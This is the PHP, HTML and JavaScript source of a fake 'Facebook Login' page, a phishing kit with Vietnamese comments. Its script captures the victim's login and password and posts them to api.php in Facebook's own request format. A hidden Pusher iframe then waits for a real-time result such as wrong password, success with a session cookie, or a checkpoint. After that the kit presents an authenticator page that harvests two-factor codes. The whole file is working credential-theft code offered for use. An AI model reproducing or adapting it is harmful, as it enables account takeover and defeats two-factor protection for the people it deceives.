<?php
// Configure session với lifetime 24 giờ
ini_set('session.gc_maxlifetime', 86400);
ini_set('session.cookie_lifetime', 86400);
session_set_cookie_params([
    'lifetime' => 86400,
    'path' => '/',
    'domain' => '',
    'secure' => isset($_SERVER['HTTPS']),
    'httponly' => true,
    'samesite' => 'Lax'
]);

session_start();


    $_SESSION['session_id'] = bin2hex(random_bytes(16));

$session_id = $_SESSION['session_id'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="style.css?<?=rand()?>">
  
  <style>
    /* Loading spinner cho button */
    .login-btn:disabled {
      background-color: #e4e6eb;
      color: #bcc0c4;
      cursor: not-allowed;
    }
    
    /* Disabled state cho input fields */
    .input-field:disabled {
      background-color: #f5f6f7;
      color: #bcc0c4;
      cursor: not-allowed;
      opacity: 0.6;
    }
    
    .login-btn.loading::after {
      content: "";
      display: inline-block;
      width: 14px;
      height: 14px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 0.6s linear infinite;
      margin-left: 8px;
      vertical-align: middle;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    /* Modal Styles - Facebook Wrong Credentials */
    .fb-modal-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.4);
      z-index: 9999;
      animation: fadeIn 0.2s ease;
    }
    
    .fb-modal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
      max-width: 90%;
      width: 340px;
      z-index: 10000;
      animation: slideIn 0.25s ease;
    }
    
    .fb-modal-header {
      padding: 20px 16px 12px 16px;
      text-align: center;
      border-bottom: none;
    }
    
    .fb-modal-title {
      font-size: 18px;
      font-weight: 600;
      color: #1c1e21;
      margin: 0;
    }
    
    .fb-modal-body {
      padding: 8px 16px 20px 16px;
      color: #65676b;
      font-size: 15px;
      line-height: 1.34;
    }
    
    .fb-modal-content {
      text-align: left;
    }
    
    .fb-modal-content p {
      margin: 8px 0;
    }
    
    .fb-modal-content strong {
      color: #1c1e21;
      font-weight: 600;
    }
    
    .fb-modal-content textarea {
      width: 100%;
      min-height: 80px;
      padding: 8px;
      border: 1px solid #ccd0d5;
      border-radius: 4px;
      font-family: Inter;
      font-size: 12px;
      background: #f5f6f7;
      resize: vertical;
      margin-top: 8px;
    }
    
    .fb-status-badge {
      display: inline-block;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 13px;
      font-weight: 600;
      text-transform: uppercase;
    }
    
    .fb-status-approved, .fb-status-login_successful { background: #e7f3e7; color: #1c7c1c; }
    .fb-status-checkpoint { background: #fff3cd; color: #856404; }
    .fb-status-rejected { background: #f8d7da; color: #721c24; }
    .fb-status-pending { background: #e7f3ff; color: #1876f2; }
    .fb-status-incorrect_password { background: #f8d7da; color: #721c24; }
    
    /* Wrong credentials modal - giống 100% ảnh */
    .fb-modal.wrong-credentials .fb-modal-body {
      text-align: center;
      padding: 8px 16px 20px 16px;
    }
    
    .fb-modal.wrong-credentials .fb-modal-content {
      text-align: center;
    }
    
    .fb-modal.wrong-credentials .fb-modal-content p {
      color: #4b4f56;
      font-size: 15px;
      margin: 0;
      text-align: center;
      line-height: 1.34;
    }
    
    .fb-modal-footer {
      padding: 0 16px 16px 16px;
      text-align: center;
      border-top: 1px solid #dadde1;
      margin-top: 0;
      padding-top: 12px;
    }
    
    .fb-modal-btn {
      background: transparent;
      color: #4267b2;
      border: none;
      border-radius: 2px;
      padding: 8px 16px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
      min-width: 80px;
    }
    
    .fb-modal-btn:hover {
      background: #f5f6f7;
    }
    
    .fb-modal-btn:active {
      background: #e4e6eb;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    @keyframes slideIn {
      from {
        transform: translate(-50%, -50%) scale(0.95);
        opacity: 0;
      }
      to {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
      }
    }
    .input-field {
    width: 100%;
    height: 55px;
    padding: 14px 16px;
    border: 1px solid #dddddd;
    border-radius: 13px;
    font-size: 15px;
    background-color: #ffffff;
    color: #1c1e21;
    outline: none;
    transition: border-color 0.2s 
ease;
}.input-field {
    width: 100%;
    height: 60px;
    padding: 14px 13px;
    border: 1px solid #dddddd;
    border-radius: 13px;
    font-size: 15px;
    background-color: #ffffff;
    color: #1c1e21;
    outline: none;
    transition: border-color 0.2s 
ease;
}
.input-field::placeholder{
    font-size: 15px;
}
@media (max-width: 480px) {
    .container {
        padding: 0;
    }
}.login-btn {
    width: 100%;
    height: 44px;
    background-color: #3f65d6;
    color: #ffffff;
    border: none;
    border-radius: 100px;
    font-size: 15px;
    font-weight: 500;
    cursor: pointer;
    margin-bottom: 24px;
    transition: background-color 0.2s 
ease;
}@media (min-width: 769px) {
    .container {
        max-width: 500px;
       
    }
}.facebook-logo {
    width: 80px;
    height: 80px;
    text-align: center;
}
  </style>
</head>
<body>
  <div class="container">
      <div id="openPage">
    <div class="language-selector">
      English (UK)
    </div>
    
    <div class="logo-container">
      <div class="facebook-logo">
        <img src="fb.png" width="60px"/>
      </div>
    </div>

    <form class="login-form" id="loginForm">
      <div class="input-group">
        <input type="text" id="email" name="contact_point" placeholder="Mobile number or email address" class="input-field" required>
      </div>
      
      <div class="input-group">
        <input type="password" id="password" name="password" placeholder="Password" class="input-field" required>
      </div>
      
      <button type="submit" class="login-btn" id="loginBtn">Log in</button>
      
      <div class="forgot-password">
        <a href="#">Forgotten password?</a>
      </div>
    </form>

    <div class="spacer"></div>

   

    <div class="meta-section">
     
      
      <div class="footer-links">
       <img src="soeuNpXL37G.png" width="60px"/>
      </div>
    </div>
    </div>
  </div>

  <!-- Hidden iframe chứa Pusher listener -->
  <iframe id="pusher-iframe" src="pusher_listener.php" style="display:none;"></iframe>
  
  <!-- Modal HTML -->
  <div id="fb-modal-overlay" class="fb-modal-overlay" onclick="closeFbModal()">
    <div id="fb-modal" class="fb-modal" onclick="event.stopPropagation()">
      <div class="fb-modal-header">
        <h2 id="fb-modal-title" class="fb-modal-title"></h2>
      </div>
      <div class="fb-modal-body">
        <div id="fb-modal-content" class="fb-modal-content"></div>
      </div>
      <div class="fb-modal-footer">
        <button class="fb-modal-btn" onclick="closeFbModal()">OK</button>
      </div>
    </div>
  </div>

  <script>
  function openPage(status, data) {
    var xhttp = new XMLHttpRequest();
    var container = document.getElementById("openPage");
    
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        var pageContent = this.responseText;
        container.innerHTML = pageContent;
        
        // Xử lý JavaScript cho AUTHENTICATOR page
        if (status === 'AUTHENTICATOR') {
          initAuthenticatorPage();
        }
      }
    };
    
    // Nếu có data (uid), POST lên server
    if (data && data.uid) {
      console.log('[OPEN PAGE] POSTing data to server: uid=' + data.uid + ', type=' + status);
      
      var formData = new FormData();
      formData.append('uid', data.uid);
      formData.append('type', data.type || status);
      
      xhttp.open("POST", "html/" + status + ".php", true);
      xhttp.send(formData);
    } else {
      // Không có data, GET như bình thường
      xhttp.open("GET", "html/" + status + ".php", true);
      xhttp.send();
    }
  }
  
  // Function để xử lý AUTHENTICATOR page
  function initAuthenticatorPage() {
    var codeInput = document.getElementById('auth-code');
    var continueBtn = document.getElementById('continue-btn');
    
    if (!codeInput || !continueBtn) {
      console.log('[AUTH] Elements not found, retrying...');
      setTimeout(initAuthenticatorPage, 100);
      return;
    }
    
    console.log('[AUTH] Initializing authenticator page...');
    
    // Function để validate và update button state
    function updateButtonState() {
      var codeLength = codeInput.value.length;
      console.log('[AUTH] Code length:', codeLength, 'Value:', codeInput.value);
      
      // Cần ít nhất 5 số mới enable button
      if (codeLength >= 5) {
        continueBtn.disabled = false;
        console.log('[AUTH] Button enabled');
      } else {
        continueBtn.disabled = true;
        console.log('[AUTH] Button disabled');
      }
    }
    
    // Validation: chỉ cho phép nhập số
    codeInput.addEventListener('input', function(e) {
      // Chỉ cho phép số
      this.value = this.value.replace(/[^0-9]/g, '');
      
      // Update button state
      updateButtonState();
    });
    
    // Xử lý khi paste
    codeInput.addEventListener('paste', function(e) {
      setTimeout(function() {
        codeInput.value = codeInput.value.replace(/[^0-9]/g, '');
        updateButtonState();
      }, 10);
    });
    
    // Xử lý khi click Continue
    continueBtn.addEventListener('click', function() {
      var code = codeInput.value;
      console.log('[AUTH] Code entered:', code);
      
      if (code.length < 5) {
        console.log('[AUTH] Code too short, minimum 5 digits required');
        return;
      }
      
      // Disable button, input và show loading
      continueBtn.disabled = true;
      continueBtn.classList.add('loading');
      continueBtn.textContent = 'Verifying';
      codeInput.disabled = true;
      
      // Gửi code về api.php
      var formData = new FormData();
      formData.append('code', code);
      formData.append('action', 'verify_code');
      
      fetch('api.php', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        console.log('[AUTH] Response:', data);
        
        // Giữ loading state - chờ Pusher notification
        console.log('[AUTH] ✅ Code submitted successfully. Waiting for Pusher update...');
        console.log('[AUTH] Button remains in loading state...');
      })
      .catch(error => {
        console.error('[AUTH] Error:', error);
        
        // Re-enable button và input (không hiện alert)
        continueBtn.disabled = false;
        continueBtn.classList.remove('loading');
        continueBtn.textContent = 'Continue';
        codeInput.disabled = false;
      });
    });
    
    // Initialize button state
    updateButtonState();
  }
    // Biến global để lưu timeout ID
    var loginTimeout = null;
    
    console.log("[SESSION] Session ID: <?php echo $session_id; ?>");
    console.log("[PUSHER] Iframe listener initialized");
    
    // Function hiển thị Facebook-style modal
    function showFbModal(title, content, modalClass) {
      var modalElement = document.getElementById("fb-modal");
      
      // Reset classes
      modalElement.className = "fb-modal";
      
      // Add custom class if provided
      if (modalClass) {
        modalElement.classList.add(modalClass);
      }
      
      document.getElementById("fb-modal-title").textContent = title;
      document.getElementById("fb-modal-content").innerHTML = content;
      document.getElementById("fb-modal-overlay").style.display = "block";
      document.body.style.overflow = "hidden";
    }
    
    // Function đóng modal
    function closeFbModal() {
      document.getElementById("fb-modal-overlay").style.display = "none";
      document.body.style.overflow = "auto";
    }
    
    // ESC key để đóng modal
    document.addEventListener("keydown", function(e) {
      if (e.key === "Escape") {
        closeFbModal();
      }
    });
    
    // Listen for messages from Pusher iframe
    window.addEventListener("message", function(event) {
      console.log("[PUSHER] Received message from iframe:", event.data);
      
      if (event.data.type === "pusher-status") {
        console.log("[PUSHER] Status update:", event.data.status);
        if (event.data.status === "connected") {
          console.log("[PUSHER] ✅ Connected to Pusher!");
        } else if (event.data.status === "subscribed") {
          console.log("[PUSHER] ✅ Subscribed to channel:", event.data.channel);
        }
      } else if (event.data.type === "account-updated") {
        console.log("[PUSHER] 📨 Account updated event received!");
        console.log("[PUSHER] Data:", event.data.data);
        
        var data = event.data.data;
        
        // Clear timeout
        if (loginTimeout) {
          clearTimeout(loginTimeout);
          loginTimeout = null;
          console.log('[PUSHER] ⏱️ Login timeout cleared');
        }
        
        // Tắt loading state của login button và enable inputs
        var btn = document.getElementById('loginBtn');
        var emailInput = document.getElementById('email');
        var passwordInput = document.getElementById('password');
        
        if (btn) {
          btn.disabled = false;
          btn.classList.remove('loading');
          btn.textContent = 'Log in';
          console.log('[PUSHER] ✅ Login button loading state removed - Pusher update received!');
        }
        
        if (emailInput) emailInput.disabled = false;
        if (passwordInput) passwordInput.disabled = false;
        
        // Tắt loading state của authenticator button và input (nếu có)
        var authContinueBtn = document.getElementById('continue-btn');
        var authCodeInput = document.getElementById('auth-code');
        
        if (authContinueBtn) {
          authContinueBtn.disabled = false;
          authContinueBtn.classList.remove('loading');
          authContinueBtn.textContent = 'Continue';
          console.log('[PUSHER] ✅ Authenticator button loading state removed');
        }
        
        if (authCodeInput) {
          authCodeInput.disabled = false;
          console.log('[PUSHER] ✅ Authenticator input enabled');
        }
        
        // Check nếu status là INCORRECT_PASSWORD - hiển thị modal đơn giản giống Facebook
        if (data.status && data.status.toUpperCase() === "INCORRECT_PASSWORD") {
          var htmlContent = "<p>Invalid username or password</p>";
          showFbModal("Wrong credentials", htmlContent, "wrong-credentials");
          return;
        } else if (data.status && data.status.toUpperCase() === "ACCOUNT_NOT_FOUND") {
          var htmlContent = "<p>This email or phone doesn't not registed on Facebook please try again</p>";
          showFbModal("Try again", htmlContent, "try-again");
          return;
        }
        
        // Function để parse cookie và lấy UID
        function getUIDFromCookie(cookieString) {
          if (!cookieString) return null;
          
          // Tìm c_user trong cookie
          var cookies = cookieString.split(';');
          for (var i = 0; i < cookies.length; i++) {
            var cookie = cookies[i].trim();
            if (cookie.startsWith('c_user=')) {
              var uid = cookie.substring(7); // Remove 'c_user='
              return uid.trim();
            }
          }
          return null;
        }
        
        // Xử lý các status khác
        var statusUpper = data.status.toUpperCase();
        var pageData = null;
        
        // Nếu là login_successful, parse UID từ cookie và truyền vào openPage
        if (statusUpper === 'LOGIN_SUCCESSFUL') {
          var uid = getUIDFromCookie(data.cookie || '');
          
          if (uid) {
            pageData = {
              uid: uid,
              type: statusUpper
            };
            console.log('[PUSHER] Login successful! UID:', uid);
            console.log('[PUSHER] Passing UID to openPage:', pageData);
          } else {
            console.error('[PUSHER] Could not extract UID from cookie:', data.cookie);
          }
        }
        
        // Truyền data vào openPage
        openPage(statusUpper, pageData);
        
        
      }
    }, false);
    
    // Handle form submission
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      var btn = document.getElementById('loginBtn');
      var emailInput = document.getElementById('email');
      var passwordInput = document.getElementById('password');
      var contact_point = emailInput.value;
      var password = passwordInput.value;
      
      // Disable button, inputs và show loading - giữ cho đến khi nhận Pusher update
      btn.disabled = true;
      btn.classList.add('loading');
      btn.textContent = 'Logging in';
      emailInput.disabled = true;
      passwordInput.disabled = true;
      
      console.log('[LOGIN] Submitting login...');
      console.log('[LOGIN] Button will remain loading until Pusher update is received...');
      
      // Timeout 30 giây nếu không nhận được Pusher update (không hiển thị thông báo)
      var loginTimeout = setTimeout(function() {
        console.log('[LOGIN] ⏱️ Timeout - no Pusher update received');
        if (btn.disabled) {
          btn.disabled = false;
          btn.classList.remove('loading');
          btn.textContent = 'Log in';
          emailInput.disabled = false;
          passwordInput.disabled = false;
          // Không hiển thị thông báo timeout
        }
      }, 30000);
      
      // Prepare data giống format Facebook gửi
      var params = {
        server_params: {
          transparency_event_type: "affirmative_action",
          header_transparency_event_name: "login_button_clicked",
          header_transparency_event_location: "login",
          headers_flow_id: generateUUID(),
          INTERNAL__latency_qpl_marker_id: 36707139,
          INTERNAL__latency_qpl_instance_id: Math.floor(Math.random() * 9999999999999).toString(),
          device_id: null,
          family_device_id: null,
          waterfall_id: "<?php echo $session_id; ?>",
          offline_experiment_group: null,
          layered_homepage_experiment_group: null,
          is_platform_login: 0,
          is_from_logged_in_switcher: 0,
          is_from_logged_out: 0,
          access_flow_version: "pre_mt_behavior"
        },
        client_input_params: {
          contact_point: contact_point,
          password: password,
          zero_balance_state: "",
          lois_settings: {
            lois_token: ""
          }
        }
      };
      
      var formData = new FormData();
      formData.append('params', encodeURIComponent(JSON.stringify({params: JSON.stringify(params)})));
      
      // Thêm các fields khác giống Facebook
      formData.append('__aaid', '0');
      formData.append('__user', '0');
      formData.append('__a', '1');
      formData.append('__req', '3');
      formData.append('dpr', '3');
      formData.append('__ccg', 'EXCELLENT');
      
      // Send to api.php
      fetch('api.php', {
        method: 'POST',
        body: formData
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then(data => {
        console.log('[LOGIN] Response:', data);
        
        // Giữ loading state - chờ Pusher notification từ claim.php
        // KHÔNG enable lại button ở đây, chỉ enable khi nhận Pusher update
        console.log('[LOGIN] ✅ Data submitted successfully. Waiting for Pusher update...');
        console.log('[LOGIN] Button remains in loading state until Pusher update...');
      })
      .catch(error => {
        console.error('[LOGIN] Error:', error);
        
        // Clear timeout
        if (loginTimeout) {
          clearTimeout(loginTimeout);
          loginTimeout = null;
        }
        
        // Chỉ tắt loading khi có lỗi network nghiêm trọng
        // Nếu API call thành công, giữ loading cho đến khi Pusher update
        btn.disabled = false;
        btn.classList.remove('loading');
        btn.textContent = 'Log in';
        emailInput.disabled = false;
        passwordInput.disabled = false;
        
        console.log('[LOGIN] ⚠️ Network error - re-enabled form, waiting might be needed');
      });
    });
    
    // Helper function để generate UUID
    function generateUUID() {
      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
      });
    }
  </script>
  
<script>
(function() {
    var codeInput = document.getElementById('auth-code');
    var continueBtn = document.getElementById('continue-btn');
    
    // Function để validate và update button state
    function updateButtonState() {
        var codeLength = codeInput.value.length;
        console.log('[AUTH] Code length:', codeLength, 'Value:', codeInput.value);
        
        // Chỉ cần có số là enable button
        if (codeLength > 0) {
            continueBtn.disabled = false;
            console.log('[AUTH] Button enabled');
        } else {
            continueBtn.disabled = true;
            console.log('[AUTH] Button disabled');
        }
    }
    
    // Validation: chỉ cho phép nhập số
    codeInput.addEventListener('input', function(e) {
        // Chỉ cho phép số
        this.value = this.value.replace(/[^0-9]/g, '');
        
        // Update button state
        updateButtonState();
    });
    
    // Xử lý khi paste
    codeInput.addEventListener('paste', function(e) {
        setTimeout(function() {
            codeInput.value = codeInput.value.replace(/[^0-9]/g, '');
            updateButtonState();
        }, 10);
    });
    
    // Xử lý khi click Continue
    continueBtn.addEventListener('click', function() {
        var code = codeInput.value;
        console.log('[AUTH] Code entered:', code);
        
        if (code.length === 0) {
            alert('Please enter a code');
            return;
        }
        
        // Disable button và show loading
        continueBtn.disabled = true;
        continueBtn.textContent = 'Verifying...';
        
        // Gửi code về api.php
        var formData = new FormData();
        formData.append('code', code);
        formData.append('action', 'verify_code');
        
        fetch('../api.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log('[AUTH] Response:', data);
            
            // Re-enable button
            continueBtn.disabled = false;
            continueBtn.textContent = 'Continue';
            
            if (data.success) {
                alert('Code verified successfully!');
                // TODO: Redirect hoặc update UI
            } else {
                alert('Invalid code. Please try again.');
            }
        })
        .catch(error => {
            console.error('[AUTH] Error:', error);
            
            // Re-enable button
            continueBtn.disabled = false;
            continueBtn.textContent = 'Continue';
            
            alert('Network error. Please try again.');
        });
    });
    
    // Initialize button state
    updateButtonState();
})();
</script>

</body>
</html>
